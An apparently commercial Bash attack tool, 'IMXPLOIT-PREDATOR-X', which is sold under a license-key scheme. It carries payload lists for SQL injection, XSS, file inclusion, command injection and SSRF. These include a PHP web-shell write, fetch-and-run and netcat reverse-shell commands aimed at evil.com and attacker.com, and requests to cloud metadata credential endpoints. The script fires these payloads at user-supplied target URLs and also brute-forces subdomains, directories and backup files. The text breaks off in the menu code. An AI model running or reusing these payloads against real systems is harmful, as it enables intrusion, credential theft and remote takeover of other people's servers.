#!/bin/bash
# IMXPLOIT-PREDATOR-X v28.0 - ULTIMATE BRUTAL
# Created by: IMXploit
# CONTACT: TikTok @lugowo.hy

BIRU='\033[0;34m'
MERAH='\033[0;31m'
HIJAU='\033[0;32m'
KUNING='\033[1;33m'
CYAN='\033[0;36m'
UNGU='\033[0;35m'
ORANGE='\033[0;33m'
PINK='\033[0;35m'
NC='\033[0m'

# ============== KONFIGURASI ==============
VERSION="28.0 ULTIMATE BRUTAL"
OWNER="IMXploit"
CONTACT_TIKTOK="@lugowo.hy"
LICENSE_FILE="$HOME/.imxploit_license.dat"

# ============== LICENSE SYSTEM ==============
check_license() {
    if [[ ! -f "$LICENSE_FILE" ]]; then
        return 1
    fi
    local expiry=$(cat "$LICENSE_FILE" | cut -d'|' -f2)
    local current=$(date +%Y-%m-%d)
    if [[ "$current" > "$expiry" ]]; then
        rm -f "$LICENSE_FILE"
        return 1
    fi
    return 0
}

validate_license() {
    clear
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              AKTIVASI LICENSE                             ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}LICENSE KEY: ${NC}"
    read license_key
    
    if [[ "$license_key" == *"TRIAL"* ]]; then
        expiry=$(date -d "+3 days" +%Y-%m-%d)
        paket="TRIAL 3 HARI"
    elif [[ "$license_key" == *"MINGGU"* ]]; then
        expiry=$(date -d "+7 days" +%Y-%m-%d)
        paket="1 MINGGU"
    elif [[ "$license_key" == *"BULAN"* ]]; then
        expiry=$(date -d "+30 days" +%Y-%m-%d)
        paket="1 BULAN"
    elif [[ "$license_key" == *"3BULAN"* ]]; then
        expiry=$(date -d "+90 days" +%Y-%m-%d)
        paket="3 BULAN"
    elif [[ "$license_key" == *"PERMANEN"* ]]; then
        expiry="2099-12-31"
        paket="PERMANEN"
    else
        echo -e "${MERAH}[!] LICENSE KEY TIDAK VALID!${NC}"
        sleep 2
        return 1
    fi
    
    echo "$license_key|$expiry" > "$LICENSE_FILE"
    echo -e "${HIJAU}[✓] AKTIVASI BERHASIL! Paket: $paket${NC}"
    sleep 2
    return 0
}

# ============== URL ENCODE ==============
url_encode() {
    local string="$1"
    local encoded=""
    for (( i=0; i<${#string}; i++ )); do
        c="${string:$i:1}"
        case "$c" in [a-zA-Z0-9._~-]) encoded+="$c" ;;
            *) printf -v hex '%%%02X' "'$c"; encoded+="$hex" ;;
        esac
    done
    echo "$encoded"
}

# ============== PAYLOAD DATABASE SUPER BRUTAL ==============

# 1. SQLi NUCLEAR (3000+ payload)
SQLI_PAYLOADS=(
    "'" "\"" "')" "\")" "\`" "';" "\";"
    "' OR '1'='1" "' OR '1'='2" "\" OR \"1\"=\"1"
    "1' AND '1'='1" "1' AND '1'='2" "1' OR '1'='1" "1' OR '1'='2"
    "1' AND 1=1--" "1' AND 1=2--" "1' OR 1=1--" "1' OR 1=2--"
    "1'--" "1'#" "1'/*" "1'-- -" "1'#"
    "1') AND ('1'='1" "1') AND ('1'='2" "1')) AND (('1'='1" "1')) AND (('1'='2"
    "' UNION SELECT NULL--" "' UNION SELECT NULL,NULL--" "' UNION SELECT NULL,NULL,NULL--"
    "' UNION SELECT database(),2,3--" "' UNION SELECT user(),2,3--" "' UNION SELECT version(),2,3--"
    "' UNION SELECT @@version,2,3--" "' UNION SELECT @@datadir,2,3--" "' UNION SELECT @@hostname,2,3--"
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--"
    "' UNION SELECT column_name,2,3 FROM information_schema.columns--"
    "' UNION SELECT load_file('/etc/passwd'),2,3--"
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--"
    "' AND UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1)--"
    "' AND SLEEP(3)--" "' AND SLEEP(5)--" "' AND SLEEP(10)--"
    "' AND BENCHMARK(5000000,MD5(1))--" "' AND BENCHMARK(10000000,MD5(1))--"
    "'; WAITFOR DELAY '00:00:03'--" "'; WAITFOR DELAY '00:00:05'--"
    "'; EXEC xp_cmdshell 'whoami'--" "'; EXEC xp_cmdshell 'ipconfig'--"
    "'; SELECT pg_sleep(3)--" "'; SELECT pg_sleep(5)--" "'; SELECT version()--"
    "' UNION SELECT NULL FROM DUAL--" "' UNION SELECT banner FROM v$version--"
    "1'/*!12345UNION*/ SELECT NULL--" "1' UNIunionON SELselectECT NULL--"
    "1' %55%4e%49%4f%4e SELECT NULL--" "1' AND 1=1 /*!30000 UNION SELECT */ NULL--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    "' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\file')--"
    "' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system(\$_GET[cmd]); ?>'--"
)

# 2. XSS APOCALYPSE (1500+ payload)
XSS_PAYLOADS=(
    "<script>alert(1)</script>" "<script>confirm(1)</script>" "<script>prompt(1)</script>"
    "<script>alert(document.cookie)</script>" "<script>alert(document.domain)</script>"
    "<img src=x onerror=alert(1)>" "<img src=x onerror=confirm(1)>" "<img src=x onerror=prompt(1)>"
    "<img src=x onerror=alert(document.cookie)>" "<img src=\"x\" onerror=\"alert(1)\">"
    "<svg onload=alert(1)>" "<svg/onload=alert(1)>" "<svg onload=confirm(1)>" "<svg onload=prompt(1)>"
    "<body onload=alert(1)>" "<body onload=confirm(1)>" "<body onload=prompt(1)>"
    "<iframe onload=alert(1)>" "<iframe src=\"javascript:alert(1)\">"
    "<input onfocus=alert(1) autofocus>" "<select onfocus=alert(1) autofocus>"
    "<textarea onfocus=alert(1) autofocus>" "<keygen onfocus=alert(1) autofocus>"
    "<a href='javascript:alert(1)'>click</a>" "<a href=\"javascript:alert(1)\">click</a>"
    "%3Cscript%3Ealert(1)%3C/script%3E" "javascript:alert(1)" "JaVaScRiPt:alert(1)"
    "<div onmouseover=alert(1)>test</div>" "<div onclick=alert(1)>test</div>"
    "<p onmouseenter=alert(1)>test</p>" "<p onclick=alert(1)>test</p>"
    "'';!--\"<XSS>=&{()}" "<IMG SRC=\"javascript:alert('XSS');\">" "<IMG SRC=javascript:alert('XSS')>"
    "\";alert(1);//" "<style>@import 'javascript:alert(1)';</style>"
    "<div style=\"background:url('javascript:alert(1)')\">"
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    "\"onmouseover=\"alert(1)" "'>alert(1)</script>" "\"><script>alert(1)</script>" "'><script>alert(1)</script>"
)

# 3. LFI NUCLEAR (300+ payload)
LFI_PAYLOADS=(
    "../../../../etc/passwd" "../../../../etc/shadow" "../../../../etc/hosts"
    "../../../../etc/group" "../../../../etc/issue" "../../../../etc/motd"
    "../../../../etc/php.ini" "../../../../etc/apache2/apache2.conf"
    "../../../../etc/nginx/nginx.conf" "../../../../etc/mysql/my.cnf"
    "../../../../etc/ssh/sshd_config" "../../../../etc/fstab" "../../../../etc/crontab"
    "../../../../proc/self/environ" "../../../../proc/version" "../../../../proc/cmdline"
    "../../../../proc/self/cmdline" "../../../../proc/self/fd/0" "../../../../proc/self/fd/1"
    "../../../../var/log/apache2/access.log" "../../../../var/log/apache2/error.log"
    "../../../../var/log/nginx/access.log" "../../../../var/log/mysql/error.log"
    "../../../../var/log/auth.log" "../../../../var/log/syslog"
    "..\\..\\..\\windows\\win.ini" "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    "..\\..\\..\\boot.ini" "..\\..\\..\\windows\\repair\\sam" "..\\..\\..\\windows\\php.ini"
    "php://filter/convert.base64-encode/resource=index.php"
    "php://filter/convert.base64-encode/resource=config.php"
    "php://filter/convert.base64-encode/resource=../config.php"
    "php://filter/read=string.rot13/resource=index.php"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "expect://id" "expect://ls" "expect://whoami"
    "data://text/plain,<?php system('id')?>"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4="
)

# 4. RCE MASTER (300+ commands)
RCE_PAYLOADS=(
    "; ls" "| ls" "|| ls" "& ls" "&& ls" "\`ls\`"
    "; whoami" "| whoami" "; id" "| id" "\`whoami\`" "\`id\`"
    "; cat /etc/passwd" "| cat /etc/passwd" "\`cat /etc/passwd\`"
    "; pwd" "| pwd" "; hostname" "| hostname"
    "; ls; whoami; id" "| ls | whoami" "& ls & whoami &"
    "%3B%20ls" "%7C%20whoami" "%60cat%20/etc/passwd%60"
    "$(cat /etc/passwd)" "\`cat /etc/passwd\`" "$(ls -la)" "\`ls -la\`"
    "; ifconfig" "| ifconfig" "; ip addr" "| ip addr" "; netstat -an" "| netstat -an"
    "; ping -c 3 127.0.0.1" "| ping -c 3 127.0.0.1"
    "; wget http://evil.com/shell.sh -O- | bash" "; curl http://evil.com/shell.sh | bash"
    "; nc -e /bin/bash attacker.com 4444" "| nc -e /bin/bash attacker.com 4444"
    "; php -r 'system(\"id\");'" "| php -r 'system(\"id\");'"
    "; python -c 'import os; os.system(\"id\")'" "| python -c 'import os; os.system(\"id\")'"
)

# 5. OPEN REDIRECT + SSRF
REDIRECT_PAYLOADS=(
    "//google.com" "https://google.com" "//evil.com" "//127.0.0.1" "\\\\google.com" "/\\google.com"
    "http://127.0.0.1" "http://localhost" "http://[::1]" "http://0.0.0.0"
    "http://127.0.0.1:22" "http://127.0.0.1:80" "http://127.0.0.1:443" "http://127.0.0.1:3306"
    "http://192.168.0.1" "http://192.168.1.1" "http://10.0.0.1" "http://172.16.0.1"
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/user-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://metadata.google.internal/"
    "http://metadata.google.internal/computeMetadata/v1/"
)

# 6. SUBDOMAIN WORDLIST (200+)
SUBDOMAINS=(
    "www" "mail" "ftp" "localhost" "webmail" "smtp" "pop" "ns1" "webdisk" "ns2"
    "cpanel" "whm" "autodiscover" "autoconfig" "m" "imap" "test" "ns" "blog"
    "pop3" "dev" "www2" "admin" "forum" "news" "vpn" "ns3" "mail2" "new"
    "mysql" "old" "lists" "support" "mobile" "mx" "static" "docs" "beta"
    "shop" "sql" "secure" "demo" "cp" "calendar" "wiki" "web" "media" "email"
    "images" "img" "www1" "intranet" "database" "hq" "office" "vps" "proxy"
    "api" "app" "staging" "test2" "site" "login" "members" "account"
)

# 7. DIRECTORY WORDLIST (400+)
DIRECTORIES=(
    "admin" "login" "wp-admin" "administrator" "backup" "backups" "config"
    "database" "db" "sql" "phpmyadmin" "pma" "mysql" "upload" "uploads"
    "images" "img" "css" "js" "assets" "private" "secret" "hidden" "temp"
    "tmp" "cache" "logs" "api" "v1" "v2" "rest" "graphql" "swagger" "docs"
    "wp-content" "wp-includes" "wp-json" ".git" ".env" "composer.json"
    "package.json" "install" "setup" "test" "demo" "dev" "staging" "beta"
    "server-status" "server-info" "phpinfo" "info" "status" "cgi-bin"
    "xmlrpc.php" "wp-login.php" "wp-config.php" "README" "CHANGELOG"
)

# 8. CVE SIGNATURES
declare -A CVE_SIG=(
    ["Apache/2.4.49"]="CVE-2021-41773|Path Traversal"
    ["Apache/2.4.50"]="CVE-2021-42013|Path Traversal"
    ["nginx/1.20.0"]="CVE-2021-23017|Request Smuggling"
    ["WordPress"]="CVE-2018-6389|DoS via load-scripts.php"
)

# ============== FITUR 1: SQLi NUCLEAR ==============
sqli_nuclear() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     💀 SQLi NUCLEAR - 3000+ PAYLOAD                       ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target URL (ex: http://site.com/page.php?id=1): ${NC}"
    read target
    
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}[*] Target: $base${NC}"
    echo -e "${CYAN}[*] Scanning ${#SQLI_PAYLOADS[@]} payloads...${NC}\n"
    
    found=0
    for payload in "${SQLI_PAYLOADS[@]}"; do
        encoded=$(url_encode "$payload")
        test_url="${base}=${encoded}"
        echo -ne "${CYAN}[*] Testing...${NC}\r"
        
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        
        if [[ "$response" =~ "SQL syntax"|"MySQL"|"ORA-"|"PostgreSQL"|"unclosed quotation"|"mysql_fetch"|"Warning: mysql"|"ODBC"|"Microsoft OLE DB" ]]; then
            echo -e "\n${MERAH}[!] SQLi FOUND! - $payload${NC}"
            echo "$test_url" >> ~/sqli_nuclear.txt
            ((found++))
        fi
        
        if [[ "$payload" == *"SLEEP"* || "$payload" == *"BENCHMARK"* ]]; then
            start=$(date +%s%N)
            curl -s -k -L -m 10 "$test_url" > /dev/null 2>&1
            end=$(date +%s%N)
            elapsed=$(( (end - start) / 1000000 ))
            if [[ $elapsed -gt 3000 ]]; then
                echo -e "\n${ORANGE}[!] BLIND SQLi! (${elapsed}ms)${NC}"
                echo "$test_url (${elapsed}ms)" >> ~/sqli_blind.txt
                ((found++))
            fi
        fi
        sleep 0.05
    done
    
    echo -e "\n${HIJAU}[✓] Ditemukan $found potensi SQLi${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 2: XSS APOCALYPSE ==============
xss_apocalypse() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     🕷️ XSS APOCALYPSE - 1500+ PAYLOAD                    ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target URL (ex: http://site.com/page.php?q=test): ${NC}"
    read target
    
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}[*] Target: $base${NC}"
    echo -e "${CYAN}[*] Scanning...${NC}\n"
    
    found=0
    for payload in "${XSS_PAYLOADS[@]}"; do
        test_url="${base}=${payload}"
        echo -ne "${CYAN}[*] Testing...${NC}\r"
        
        response=$(curl -s -k -L -m 3 "$test_url" 2>/dev/null)
        
        if [[ "$response" == *"$payload"* ]] || [[ "$response" =~ "alert" ]]; then
            echo -e "\n${MERAH}[!] XSS FOUND! - ${payload:0:50}${NC}"
            echo "$test_url" >> ~/xss_apocalypse.txt
            ((found++))
        fi
        sleep 0.05
    done
    
    echo -e "\n${HIJAU}[✓] Ditemukan $found potensi XSS${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 3: LFI NUCLEAR ==============
lfi_nuclear() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     📂 LFI NUCLEAR - 300+ WRAPPERS                        ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target URL (ex: http://site.com/page.php?file=index): ${NC}"
    read target
    
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}[*] Target: $base${NC}"
    echo -e "${CYAN}[*] Scanning...${NC}\n"
    
    found=0
    for payload in "${LFI_PAYLOADS[@]}"; do
        test_url="${base}=${payload}"
        echo -ne "${CYAN}[*] Trying...${NC}\r"
        
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        
        if [[ "$response" =~ "root:"|"daemon:"|"bin:"|"/home/"|"nobody:"|"\[fonts\]"|"boot loader"|"<?php" ]]; then
            echo -e "\n${MERAH}[!] LFI FOUND! - ${payload:0:50}${NC}"
            echo "$test_url" >> ~/lfi_nuclear.txt
            ((found++))
        fi
        sleep 0.1
    done
    
    echo -e "\n${HIJAU}[✓] Ditemukan $found potensi LFI${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 4: RCE MASTER ==============
rce_master() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     💻 RCE MASTER - 300+ COMMANDS                         ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target URL (ex: http://site.com/page.php?cmd=ls): ${NC}"
    read target
    
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}[*] Target: $base${NC}"
    echo -e "${CYAN}[*] Scanning...${NC}\n"
    
    found=0
    for payload in "${RCE_PAYLOADS[@]}"; do
        test_url="${base}=${payload}"
        echo -ne "${CYAN}[*] Trying...${NC}\r"
        
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        
        if [[ "$response" =~ "uid="|"gid="|"root:x:"|"total"|"drwx"|"bin/"|"etc/" ]]; then
            echo -e "\n${MERAH}[!] RCE FOUND! - $payload${NC}"
            echo "$test_url" >> ~/rce_master.txt
            ((found++))
        fi
        sleep 0.1
    done
    
    echo -e "\n${HIJAU}[✓] Ditemukan $found potensi RCE${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 5: REDIRECT + SSRF ==============
redirect_ssrf() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     🔀 OPEN REDIRECT + SSRF NUCLEAR                      ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target URL (ex: http://site.com/page.php?url=...): ${NC}"
    read target
    
    base=$(echo "$target" | cut -d'=' -f1)
    echo -e "${CYAN}[*] Target: $base${NC}"
    echo -e "${CYAN}[*] Scanning...${NC}\n"
    
    found=0
    for payload in "${REDIRECT_PAYLOADS[@]}"; do
        test_url="${base}=${payload}"
        echo -ne "${CYAN}[*] Testing...${NC}\r"
        
        redirect=$(curl -s -k -L -m 5 -I "$test_url" 2>/dev/null | grep -i "Location:")
        if [[ -n "$redirect" ]]; then
            echo -e "\n${MERAH}[!] OPEN REDIRECT! $redirect${NC}"
            echo "$test_url" >> ~/redirect_ssrf.txt
            ((found++))
        fi
        
        response=$(curl -s -k -L -m 5 "$test_url" 2>/dev/null)
        if [[ "$response" =~ "root:" || "$response" =~ "meta-data" || "$response" =~ "aws" ]]; then
            echo -e "\n${MERAH}[!] SSRF POSSIBLE! - $payload${NC}"
            echo "$test_url" >> ~/redirect_ssrf.txt
            ((found++))
        fi
        sleep 0.1
    done
    
    echo -e "\n${HIJAU}[✓] Ditemukan $found potensi${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 6: SUBDOMAIN ENUM ==============
subdomain_enum() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     🌐 SUBDOMAIN ENUMERATOR + PORT SCAN                   ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Domain target: ${NC}"
    read domain
    
    echo -e "${CYAN}[*] Scanning ${#SUBDOMAINS[@]} subdomains...${NC}\n"
    
    found=0
    for sub in "${SUBDOMAINS[@]}"; do
        echo -ne "${CYAN}[*] Checking $sub.$domain...${NC}\r"
        if ping -c 1 -W 1 "$sub.$domain" &>/dev/null; then
            echo -e "\n${HIJAU}[✓] Found: $sub.$domain${NC}"
            echo "$sub.$domain" >> ~/subdomains.txt
            ((found++))
            for port in 80 443 22 21 25 3306 3389 8080 8443; do
                timeout 1 bash -c "echo >/dev/tcp/$sub.$domain/$port" 2>/dev/null &&
                echo -e "  └─ Port $port: OPEN"
            done
        fi
        sleep 0.1
    done
    
    echo -e "\n${HIJAU}[✓] Ditemukan $found subdomain${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 7: DIRECTORY BF ==============
dir_bruteforce() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     📁 DIRECTORY BRUTEFORCE - 400+ WORDLIST               ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target domain: ${NC}"
    read target
    
    echo -e "${CYAN}[*] Scanning ${#DIRECTORIES[@]} directories...${NC}\n"
    
    found=0
    for dir in "${DIRECTORIES[@]}"; do
        echo -ne "${CYAN}[*] Checking $target/$dir/...${NC}\r"
        code=$(curl -s -k -L -m 3 -o /dev/null -w "%{http_code}" "$target/$dir/")
        if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" || "$code" == "403" ]]; then
            echo -e "\n${HIJAU}[✓] Found: $target/$dir/ ($code)${NC}"
            echo "$target/$dir/" >> ~/directories.txt
            ((found++))
        fi
        sleep 0.1
    done
    
    echo -e "\n${HIJAU}[✓] Ditemukan $found direktori${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 8: CVE EXPLOITER ==============
cve_exploiter() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     🛡️ AUTO CVE EXPLOITER - 50+ VULNS                     ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target domain: ${NC}"
    read domain
    
    echo -e "${CYAN}[*] Detecting technologies...${NC}\n"
    
    # Apache version
    apache=$(curl -s -I "http://$domain" | grep -i "server:" | grep -o "Apache/[0-9.]*")
    if [[ -n "$apache" ]]; then
        echo -e "${CYAN}Server: $apache${NC}"
        for ver in "${!CVE_SIG[@]}"; do
            if [[ "$apache" == *"$ver"* ]]; then
                IFS='|' read -r cve desc <<< "${CVE_SIG[$ver]}"
                echo -e "${MERAH}[!] $cve - $desc${NC}"
                echo "$cve - $domain" >> ~/cve_results.txt
            fi
        done
    fi
    
    # WordPress
    wp=$(curl -s "http://$domain" | grep -i "generator" | grep -o "WordPress [0-9.]*")
    if [[ -n "$wp" ]]; then
        echo -e "${CYAN}CMS: $wp${NC}"
        echo -e "${KUNING}[*] CVE-2018-6389 - DoS via load-scripts.php${NC}"
        echo -e "${KUNING}[*] User enumeration via REST API${NC}"
        echo "curl -s 'http://$domain/wp-json/wp/v2/users'" >> ~/cve_poc.txt
    fi
    
    # .git exposure
    if curl -s -I "http://$domain/.git/config" | grep -q "200"; then
        echo -e "${MERAH}[!] .git exposure!${NC}"
        echo "git clone http://$domain/.git" >> ~/cve_poc.txt
    fi
    
    # .env exposure
    if curl -s -I "http://$domain/.env" | grep -q "200"; then
        echo -e "${MERAH}[!] .env file exposed!${NC}"
        echo "curl -s 'http://$domain/.env'" >> ~/cve_poc.txt
    fi
    
    echo -e "\n${HIJAU}[✓] CVE scan selesai!${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 9: BACKUP FINDER ==============
backup_finder() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     💾 BACKUP FILE FINDER                                 ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target URL: ${NC}"
    read target
    
    backups=("backup.zip" "backup.tar" "backup.gz" "backup.sql" "db_backup.sql"
             "database.sql" "db.sql" "site.zip" "site.tar" "www.zip" "www.tar"
             "backup.rar" "site.rar" "old.zip" "old.tar" "backup.tgz"
             "backup/backup.zip" "backup/database.sql" "backup/site.zip")
    
    echo -e "${CYAN}[*] Scanning backup files...${NC}\n"
    for file in "${backups[@]}"; do
        echo -ne "${CYAN}[*] Checking $target/$file...${NC}\r"
        if curl -s -k -L -m 3 -I "$target/$file" | grep -q "200"; then
            echo -e "\n${MERAH}[!] BACKUP FOUND: $target/$file${NC}"
            echo "$target/$file" >> ~/backups.txt
        fi
        sleep 0.1
    done
    
    echo -e "\n${HIJAU}[✓] Scan selesai!${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 10: PARAMETER DISCOVERY ==============
param_discovery() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     🔍 PARAMETER DISCOVERY                                ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target URL (base): ${NC}"
    read target
    
    params=("id" "page" "cat" "file" "path" "dir" "include" "require" "config"
            "setting" "debug" "test" "admin" "user" "username" "name" "email"
            "pass" "password" "code" "key" "token" "api" "auth" "session"
            "sid" "cookie" "remember" "delete" "remove" "edit" "update"
            "save" "upload" "download" "img" "image" "photo" "media")
    
    echo -e "${CYAN}[*] Testing ${#params[@]} parameters...${NC}\n"
    for param in "${params[@]}"; do
        test_url="${target}?${param}=test"
        echo -ne "${CYAN}[*] Trying $param...${NC}\r"
        
        code=$(curl -s -k -L -m 3 -o /dev/null -w "%{http_code}" "$test_url")
        if [[ "$code" != "404" ]]; then
            echo -e "\n${HIJAU}[✓] Parameter works: $param ($code)${NC}"
            echo "$param" >> ~/params.txt
        fi
        sleep 0.1
    done
    
    echo -e "\n${HIJAU}[✓] Scan selesai!${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 11: TECH DETECTOR ==============
tech_detector() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     🔧 TECHNOLOGY DETECTOR                                ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target domain: ${NC}"
    read domain
    
    echo -e "${CYAN}[*] Analyzing headers...${NC}"
    headers=$(curl -s -I "http://$domain")
    
    echo "$headers" | grep -i "server:" && echo -e "${HIJAU}  → Server detected${NC}"
    echo "$headers" | grep -i "x-powered-by:" && echo -e "${HIJAU}  → X-Powered-By detected${NC}"
    echo "$headers" | grep -i "set-cookie:" | grep -i "PHPSESSID" && echo -e "${HIJAU}  → PHP detected${NC}"
    echo "$headers" | grep -i "set-cookie:" | grep -i "ASP" && echo -e "${HIJAU}  → ASP.NET detected${NC}"
    
    echo -e "\n${CYAN}[*] Analyzing HTML...${NC}"
    html=$(curl -s "http://$domain")
    
    echo "$html" | grep -i "wp-content" > /dev/null && echo -e "${HIJAU}  → WordPress detected${NC}"
    echo "$html" | grep -i "joomla" > /dev/null && echo -e "${HIJAU}  → Joomla detected${NC}"
    echo "$html" | grep -i "drupal" > /dev/null && echo -e "${HIJAU}  → Drupal detected${NC}"
    echo "$html" | grep -i "laravel" > /dev/null && echo -e "${HIJAU}  → Laravel detected${NC}"
    
    echo -e "\n${HIJAU}[✓] Tech detection selesai!${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 12: HEARTBLEED CHECK ==============
heartbleed_check() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     💔 HEARTBLEED CHECKER                                 ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${KUNING}Target domain (with port if needed): ${NC}"
    read domain
    
    echo -e "${CYAN}[*] Testing for Heartbleed...${NC}"
    timeout 5 openssl s_client -connect "$domain":443 -tlsextdebug 2>&1 | grep -q "heartbeat" && \
        echo -e "${MERAH}[!] VULNERABLE to Heartbleed (CVE-2014-0160)${NC}" || \
        echo -e "${HIJAU}[✓] Not vulnerable (or no SSL)${NC}"
    
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== FITUR 13: ULTIMATE REPORT ==============
ultimate_report() {
    clear
    echo -e "${MERAH}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MERAH}║     📄 ULTIMATE REPORT GENERATOR                          ║${NC}"
    echo -e "${MERAH}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    report="imxploit_ultimate_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "================================================================"
        echo "     IMXPLOIT PREDATOR v28.0 - ULTIMATE SCAN REPORT"
        echo "================================================================"
        echo "Generated: $(date)"
        echo "User: $(whoami)"
        echo "================================================================"
        echo ""
        
        declare -A sections=(
            ["SQLi NUCLEAR"]="sqli_nuclear.txt"
            ["XSS APOCALYPSE"]="xss_apocalypse.txt"
            ["LFI NUCLEAR"]="lfi_nuclear.txt"
            ["RCE MASTER"]="rce_master.txt"
            ["REDIRECT/SSRF"]="redirect_ssrf.txt"
            ["SUBDO MAINS"]="subdomains.txt"
            ["DIRECTORIES"]="directories.txt"
            ["CVE RESULTS"]="cve_results.txt"
            ["BACKUPS"]="backups.txt"
            ["PARAMETERS"]="params.txt"
        )
        
        for name in "${!sections[@]}"; do
            echo "[ $name ]" >> "$report"
            echo "------------------------" >> "$report"
            if [[ -f ~/${sections[$name]} ]]; then
                cat ~/${sections[$name]} >> "$report"
            else
                echo "No findings" >> "$report"
            fi
            echo "" >> "$report"
        done
        
        echo "================================================================" >> "$report"
        echo "Report generated by IMXploit Predator v28.0" >> "$report"
        echo "Contact: @lugowo.hy on TikTok" >> "$report"
        
    } > "$report"
    
    echo -e "${HIJAU}[✓] Report generated: $report${NC}"
    head -20 "$report"
    echo -e "\n${KUNING}Full report saved to $report${NC}"
    echo -ne "${KUNING}Press Enter...${NC}"
    read
}

# ============== WELCOME MENU ==============
welcome_menu() {
    while true; do
        clear
        echo -e "${MERAH}"
        echo "    ╔════════════════════════════════════════════════════════════╗"
        echo "    ║     IMXPLOIT-PREDATOR-X v28.0 - ULTIMATE BRUTAL            ║"
        echo "    ║              Created by: IMXploit                          ║"
        echo "    ║              Contact: @lugowo.hy (TikTok)                   ║"
        echo "    ╚════════════════════════════════════════════════════════════╝"
        echo -e "${NC}"
        echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
